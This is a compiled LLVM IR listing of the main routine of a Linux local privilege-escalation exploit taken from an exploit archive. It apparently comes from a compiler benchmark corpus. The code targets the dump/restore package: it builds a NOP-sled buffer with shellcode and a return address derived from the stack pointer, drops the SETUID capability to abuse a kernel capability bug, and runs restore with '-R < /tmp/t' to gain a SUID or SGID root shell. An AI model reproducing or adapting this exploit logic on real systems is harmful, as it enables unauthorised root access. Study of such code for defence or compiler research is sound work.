; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20004.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20004.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.__user_cap_data_struct = type { i32, i32, i32 }
%struct.__user_cap_header_struct = type { i32, i32 }

@.str = private unnamed_addr constant [44 x i8] c"Assuming Dump package version: dump-0.3-14\0A\00", align 1
@.str.1 = private unnamed_addr constant [35 x i8] c"Trying to grab SGID root shell...\0A\00", align 1
@RETA314 = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [35 x i8] c"Trying to grab SUID root shell...\0A\00", align 1
@.str.3 = private unnamed_addr constant [44 x i8] c"Assuming Dump package version: dump-0.4b13\0A\00", align 1
@RETA4b13 = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [24 x i8] c"Unknown type - exiting\0A\00", align 1
@_LINUX_CAPABILITY_VERSION = common dso_local global i32 0, align 4
@__const.main.capd = private unnamed_addr constant %struct.__user_cap_data_struct { i32 0, i32 0, i32 -385 }, align 4
@.str.5 = private unnamed_addr constant [27 x i8] c"Dropped the SETUID_CAP...\0A\00", align 1
@NUMNOPS = common dso_local global i32 0, align 4
@hellcode = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"/tmp/t\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"Building C program wrapper...\0A\00", align 1
@.str.9 = private unnamed_addr constant [45 x i8] c"Building ShellScript that will be called...\0A\00", align 1
@.str.10 = private unnamed_addr constant [27 x i8] c"Building overflow file...\0A\00", align 1
@.str.11 = private unnamed_addr constant [19 x i8] c"Using address: %x\0A\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"n\0An\0An\0An\0A1\0A\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\0A1\0Anone\0A\00", align 1
@.str.14 = private unnamed_addr constant [15 x i8] c"Executing: %s\0A\00", align 1
@RESTAT = common dso_local global i8* null, align 8
@.str.15 = private unnamed_addr constant [16 x i8] c"%s -R < /tmp/t\0A\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"/tmp/lk\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"\0AIf everything worked out you can now run: %s\0A\00", align 1
@SHELLAT = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.__user_cap_header_struct, align 4
  %15 = alloca %struct.__user_cap_data_struct, align 4
  %16 = alloca [200 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 2
  br i1 %18, label %19, label %22

19:                                               ; preds = %2
  %20 = call i32 (...) @banner()
  %21 = call i32 @exit(i32 -1) #4
  unreachable

22:                                               ; preds = %2
  %23 = load i32, i32* %4, align 4
  %24 = icmp eq i32 %23, 3
  br i1 %24, label %25, label %30

25:                                               ; preds = %22
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 2
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @atoi(i8* %28)
  store i32 %29, i32* %10, align 4
  br label %30

30:                                               ; preds = %25, %22
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 1
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33)
  switch i32 %34, label %51 [
    i32 1, label %35
    i32 2, label %39
    i32 3, label %43
    i32 4, label %47
  ]

35:                                               ; preds = %30
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %13, align 4
  store i32 2500, i32* %10, align 4
  %38 = load i32, i32* @RETA314, align 4
  store i32 %38, i32* %11, align 4
  br label %54

39:                                               ; preds = %30
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  store i32 2, i32* %13, align 4
  store i32 2500, i32* %10, align 4
  %42 = load i32, i32* @RETA314, align 4
  store i32 %42, i32* %11, align 4
  br label %54

43:                                               ; preds = %30
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0))
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %13, align 4
  store i32 6000, i32* %10, align 4
  %46 = load i32, i32* @RETA4b13, align 4
  store i32 %46, i32* %11, align 4
  br label %54

47:                                               ; preds = %30
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0))
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  store i32 2, i32* %13, align 4
  store i32 6000, i32* %10, align 4
  %50 = load i32, i32* @RETA4b13, align 4
  store i32 %50, i32* %11, align 4
  br label %54

51:                                               ; preds = %30
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  %53 = call i32 @exit(i32 -1) #4
  unreachable

54:                                               ; preds = %47, %43, %39, %35
  %55 = load i32, i32* %13, align 4
  %56 = icmp eq i32 %55, 2
  br i1 %56, label %57, label %64

57:                                               ; preds = %54
  %58 = getelementptr inbounds %struct.__user_cap_header_struct, %struct.__user_cap_header_struct* %14, i32 0, i32 0
  %59 = load i32, i32* @_LINUX_CAPABILITY_VERSION, align 4
  store i32 %59, i32* %58, align 4
  %60 = getelementptr inbounds %struct.__user_cap_header_struct, %struct.__user_cap_header_struct* %14, i32 0, i32 1
  store i32 0, i32* %60, align 4
  %61 = bitcast %struct.__user_cap_data_struct* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %61, i8* align 4 bitcast (%struct.__user_cap_data_struct* @__const.main.capd to i8*), i64 12, i1 false)
  %62 = call i32 @capset(%struct.__user_cap_header_struct* %14, %struct.__user_cap_data_struct* %15)
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0))
  br label %64

64:                                               ; preds = %57, %54
  %65 = call i32 (...) @get_sp()
  %66 = load i32, i32* %10, align 4
  %67 = sub nsw i32 %65, %66
  %68 = sext i32 %67 to i64
  store i64 %68, i64* %9, align 8
  %69 = load i32, i32* %11, align 4
  %70 = add nsw i32 %69, 5
  %71 = call i64 @malloc(i32 %70)
  %72 = inttoptr i64 %71 to i8*
  store i8* %72, i8** %8, align 8
  %73 = load i8*, i8** %8, align 8
  %74 = load i32, i32* %11, align 4
  %75 = call i32 @memset(i8* %73, i32 144, i32 %74)
  %76 = load i8*, i8** %8, align 8
  %77 = load i32, i32* @NUMNOPS, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i32, i32* @hellcode, align 4
  %81 = load i32, i32* @hellcode, align 4
  %82 = call i32 @strlen(i32 %81)
  %83 = call i32 @memcpy(i8* %79, i32 %80, i32 %82)
  %84 = load i64, i64* %9, align 8
  %85 = and i64 %84, 255
  %86 = trunc i64 %85 to i8
  %87 = load i8*, i8** %8, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  store i8 %86, i8* %90, align 1
  %91 = load i64, i64* %9, align 8
  %92 = lshr i64 %91, 8
  %93 = and i64 %92, 255
  %94 = trunc i64 %93 to i8
  %95 = load i8*, i8** %8, align 8
  %96 = load i32, i32* %11, align 4
  %97 = add nsw i32 %96, 1
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %95, i64 %98
  store i8 %94, i8* %99, align 1
  %100 = load i64, i64* %9, align 8
  %101 = lshr i64 %100, 16
  %102 = and i64 %101, 255
  %103 = trunc i64 %102 to i8
  %104 = load i8*, i8** %8, align 8
  %105 = load i32, i32* %11, align 4
  %106 = add nsw i32 %105, 2
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %104, i64 %107
  store i8 %103, i8* %108, align 1
  %109 = load i64, i64* %9, align 8
  %110 = lshr i64 %109, 24
  %111 = and i64 %110, 255
  %112 = trunc i64 %111 to i8
  %113 = load i8*, i8** %8, align 8
  %114 = load i32, i32* %11, align 4
  %115 = add nsw i32 %114, 3
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %113, i64 %116
  store i8 %112, i8* %117, align 1
  %118 = load i8*, i8** %8, align 8
  %119 = load i32, i32* %11, align 4
  %120 = add nsw i32 %119, 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %118, i64 %121
  store i8 0, i8* %122, align 1
  %123 = call i32* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  store i32* %123, i32** %6, align 8
  %124 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0))
  %125 = call i32 (...) @makeCFILE()
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.9, i64 0, i64 0))
  %127 = load i32, i32* %13, align 4
  %128 = icmp eq i32 %127, 1
  br i1 %128, label %129, label %131

129:                                              ; preds = %64
  %130 = call i32 (...) @makeLKregular()
  br label %131

131:                                              ; preds = %129, %64
  %132 = load i32, i32* %13, align 4
  %133 = icmp eq i32 %132, 2
  br i1 %133, label %134, label %136

134:                                              ; preds = %131
  %135 = call i32 (...) @makeLKbuggyKernel()
  br label %136

136:                                              ; preds = %134, %131
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.10, i64 0, i64 0))
  %138 = load i64, i64* %9, align 8
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0), i64 %138)
  %140 = load i32*, i32** %6, align 8
  %141 = call i32 @fprintf(i32* %140, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i64 0, i64 0))
  %142 = load i32*, i32** %6, align 8
  %143 = load i8*, i8** %8, align 8
  %144 = call i32 @fprintf(i32* %142, i8* %143)
  %145 = load i32*, i32** %6, align 8
  %146 = call i32 @fprintf(i32* %145, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i64 0, i64 0))
  %147 = load i32*, i32** %6, align 8
  %148 = call i32 @fflush(i32* %147)
  %149 = load i32*, i32** %6, align 8
  %150 = call i32 @fclose(i32* %149)
  %151 = load i8*, i8** @RESTAT, align 8
  %152 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0), i8* %151)
  %153 = call i32 @sleep(i32 3)
  %154 = call i32 (...) @fork()
  store i32 %154, i32* %12, align 4
  %155 = icmp eq i32 %154, 0
  br i1 %155, label %156, label %164

156:                                              ; preds = %136
  %157 = getelementptr inbounds [200 x i8], [200 x i8]* %16, i64 0, i64 0
  %158 = load i8*, i8** @RESTAT, align 8
  %159 = call i32 @snprintf(i8* %157, i32 200, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0), i8* %158)
  %160 = getelementptr inbounds [200 x i8], [200 x i8]* %16, i64 0, i64 0
  %161 = call i32 @system(i8* %160)
  %162 = call i32 @unlink(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %163 = call i32 @unlink(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0))
  br label %164

164:                                              ; preds = %156, %136
  %165 = load i8*, i8** @SHELLAT, align 8
  %166 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i64 0, i64 0), i8* %165)
  %167 = load i32, i32* %3, align 4
  ret i32 %167
}

declare dso_local i32 @banner(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @capset(%struct.__user_cap_header_struct*, %struct.__user_cap_data_struct*) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @makeCFILE(...) #1

declare dso_local i32 @makeLKregular(...) #1

declare dso_local i32 @makeLKbuggyKernel(...) #1

declare dso_local i32 @fprintf(i32*, i8*) #1

declare dso_local i32 @fflush(i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @unlink(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
